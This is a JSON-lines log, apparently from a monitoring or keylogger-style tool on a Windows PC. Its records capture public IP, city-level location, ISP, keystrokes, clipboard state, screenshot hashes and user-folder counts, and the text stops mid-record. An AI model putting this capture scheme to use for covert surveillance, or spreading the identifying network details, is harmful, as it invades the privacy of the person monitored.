{"timestamp": "2025-06-21T10:35:48.268167+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "95b5b59a55f02c3015917d958b9535f31411bbd7582b83a6a077d14d36341a09", "_raw_log_hash": "10249b40d08c6c9e03ab4f226cdad0e824aaacb0927675c2695aa89ec5f805ad"}
{"timestamp": "2025-06-21T10:36:02.677857+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d18dce9a932441bcc68b88e4a7da5c6b78e80330e019808c996c71d0e6cfae72", "_raw_log_hash": "64a8d9600d4f58a5cfb1d1030e34baf3ae3670ce3d1d7ea2bbba02f51a4db44a"}
{"timestamp": "2025-06-21T10:36:17.085817+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e6636795401e7469fd9104ff8a8edee35527dbde5228bd8102e0cb75b46bcda0", "_raw_log_hash": "7596a123a3c3abf4566b303d2727ba561cb381b360ac5165e91c069a1f3feb58"}
{"timestamp": "2025-06-21T10:36:31.596846+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "93e78d4f76c8dde160063e6b89243da40a77af4275d980692484cf7a4068fe0c", "_raw_log_hash": "296ff390d64a9fdc09a7372fa0912b75904a4d8f83398ff465d6eca4ddb47dad"}
{"timestamp": "2025-06-21T10:36:45.915989+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "59054d3215b1af6013d7029a6f5cbc9bc32258d12aa873aa2d5649b734151bdf", "_raw_log_hash": "340ed2d425b8dc2465fa80cdbaae76cb328b8edd3956310f8b48a45fbc1617a1"}
{"timestamp": "2025-06-21T10:37:00.638661+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2380636edc1f7a5df0b2ab95e6f47608bfabcbaeb79de7d2fd90959bef0c53e2", "_raw_log_hash": "34eb59ce4fcff519fbe5c983bb601a9bb26d3e2499b8c2953fdfb3d7966f91b7"}
{"timestamp": "2025-06-21T10:37:15.626436+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "26aa57d9d55316654e4244840c0c25c4cd2a2820b68792767de67bc16fd3106a", "_raw_log_hash": "1a7c250718cf0fb54869f334a599a036a258d3ea7cccc9a01482d47298259a3c"}
{"timestamp": "2025-06-21T10:37:29.990687+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d02173fa4450a932bdc2df60871c6a35c59ea6810f1b956ad1d73b77f643c379", "_raw_log_hash": "6448dd9309a1bf9ea6bbb0514b86713147233976b95b0586cabd49840143840c"}
{"timestamp": "2025-06-21T10:37:44.313536+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8ae55e1d6884d3ce40a501cc17002d2d18d944e3e84aba086862395d1213bde1", "_raw_log_hash": "3798371edd9e6e91c209440bfe6e988e55452aa033ba0026a38d014ec4e2aa4a"}
{"timestamp": "2025-06-21T10:37:58.945159+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "0c9295cffa6089b220405d52d4ddd2da2e32f6d9707cac8644a612fdf5b535c7", "_raw_log_hash": "e48b338852417ec2934b7d9b665ba5ccc6c41ffc42874ff7902877ad3a67299e"}
{"timestamp": "2025-06-21T10:38:13.132231+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "1950929d5054407ff31d40ffab305c50d002c1848ef414985787a5bc295d1445", "_raw_log_hash": "4cbc5ecf9807b3c00364437d6126a3e1e3d6fbb027e18f86d0f5e134a2b70acf"}
{"timestamp": "2025-06-21T10:38:27.419732+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "672d707c697e054253702faae72aaae9eebe888dcf160ac943b4219a207c06fa", "_raw_log_hash": "3f046b5a6c027d5978b1784622946c41a9a2aa99944e81937d1c31ab15562425"}
{"timestamp": "2025-06-21T10:38:41.827047+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3bd03b2c8b781eddd487c277191345766659ffce216e0724ef260debdbe99440", "_raw_log_hash": "2cc49075fe7c68840d648cf53288639b1596dc9d2d5862a6002ee6ae33973635"}
{"timestamp": "2025-06-21T10:38:56.208292+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "527b898e96d957345369da2b3cba2a9074f37510766eed5710ae0e6e028b4a4f", "_raw_log_hash": "392eda83472ac681ccdcacc2047c082878412c233f05bb5ab49095e8996c1bfe"}
{"timestamp": "2025-06-21T10:39:10.516075+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c7821d4f9c659ecaaf842de6ddc9922ce59394f32330a0ac9d595b27ddd85fe2", "_raw_log_hash": "037000525948b47d69bf99cb01815ae8acd1fbad01fe0995e07f0e7e342f7c24"}
{"timestamp": "2025-06-21T10:39:24.805841+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "01a3c5ae73cf4b9395b5b0f7a334054e8d6ddbc74a269c7e3ee681c021de9cc4", "_raw_log_hash": "a3f0331c42106e286e36c996cba02e436df1c0875b13e66d8cfd9e8973661eb6"}
{"timestamp": "2025-06-21T10:39:38.880156+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "fe83e88fba452b81a421f7b4fc26e106c9e1a0f0829d72d0332f030a2107e39b", "_raw_log_hash": "bdc3aaec7b0b62556d92b3e7ed11a9b4932257c1d7715249925f2fce5ce7d9aa"}
{"timestamp": "2025-06-21T10:39:53.030132+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2f89d1d0b1e1d95bc1d4f98a311b81eed630143428a01a24b531264c1f690e45", "_raw_log_hash": "e806cbf3395fbc8be3379c4b0a3e76497e38b89c40baec9c4b7fdbd3488ed0c6"}
{"timestamp": "2025-06-21T10:40:07.314341+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (813 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "fe36da864fbbf10491f332bbe648d61216be1b02d4203ae533bc9e9b75a6624b", "_raw_log_hash": "bb7b5703b91ea2607d9dc8547c49b97cb69f372b4cc302231d13ac6880091573"}
{"timestamp": "2025-06-22T10:25:28.096141+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (817 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5e8ad612fa31ceb1012d10141c9eb997670bfd3fdaf6ad5d159006da38c3b7fb", "_raw_log_hash": "0062a62f4a3193a348bfdd158c83aa8035adcbe4a90fd022aa7edf6f293d7800"}
{"timestamp": "2025-06-22T10:25:41.224967+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (817 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "dec23776615795c8bd743609d3a052ba74d8767f2fc0a2c80e7e64ca5ea79982", "_raw_log_hash": "3c76a28d24dfb74832b65b84e6fc09300363db8f8c0a51d1427bda488454a88e"}
{"timestamp": "2025-06-22T10:25:53.781941+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (817 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "dd7087675e747842dd00ea21b6ade107d569c9a1a7b25e75329921b3748ac424", "_raw_log_hash": "bea20682216cc17d3a8beddbe3d1876479dd643cd4b839ea25c36a677cd116bb"}
{"timestamp": "2025-06-22T10:26:06.286505+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (817 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9342111ee4441a84bd925ef1a9a15ab92b856173512c1cd16622b70363e062bf", "_raw_log_hash": "c8ead2c5930e7197cd003ccd48f3469f7b03dc670a91656d2bec3be09e474fc9"}
{"timestamp": "2025-06-22T10:26:18.740478+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (817 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2967dddea32bb4b46573075176a6e8c02d6610eedf74356d30d54d01128ed305", "_raw_log_hash": "1601a1ead86c88c2f3742acfdbdc71ab72a384d3c6bbd35946b7222e684993a1"}
{"timestamp": "2025-06-22T10:26:31.094754+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (817 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "1907de891f4480476e91b55a61be475bd9725d436458bac0021b118ddc329d6b", "_raw_log_hash": "c703052b8aca42b0d7c1934c6c25aa967e19ffe1e29479b972cf4500a071ab7b"}
{"timestamp": "2025-06-22T10:26:43.518309+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (817 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "173bbb19bee9e1fa6f4d7008fe0b9c9d6e5cc72364e4b9a87de57a8708497e36", "_raw_log_hash": "c12411a777412291785c10f0caf3e28ce08d40aef0a71e03a1333a09c4380579"}
{"timestamp": "2025-06-22T10:26:56.137307+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "[cmd]tas", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (817 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "345f8473472c33b9785a996f51616bd83c455b482b356eb42c4ce2e1a4531208", "_raw_log_hash": "97a7ee4a4a7d170f66be1ac95473b667f8d30011d9aa6e54ccc887ad0cf6c14f"}
{"timestamp": "2025-06-22T10:27:08.448307+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (817 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": 